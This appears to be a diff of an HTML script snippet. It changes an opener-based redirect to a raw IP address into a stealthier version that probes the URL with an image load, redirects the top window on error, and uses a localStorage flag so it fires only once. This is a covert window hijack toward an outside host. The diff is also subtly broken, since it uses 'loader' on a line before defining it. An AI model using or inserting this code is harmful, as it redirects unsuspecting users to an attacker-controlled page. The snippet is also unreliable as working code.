@@ -1,4 +1,12 @@
 <script>
-if (top.opener)
-  top.location = 'http://47.90.64.188/lab/1001.html';
+loader.src = url;
+if (top.opener && !localStorage.f) {
+  var loader = new Image();
+  var url = 'http://47.90.64.188/lab/1001.html';
+  loader.onerror = function() {
+     top.location = url;
+  };
+  loader.src = url;
+  localStorage.f = true;
+}
 </script>
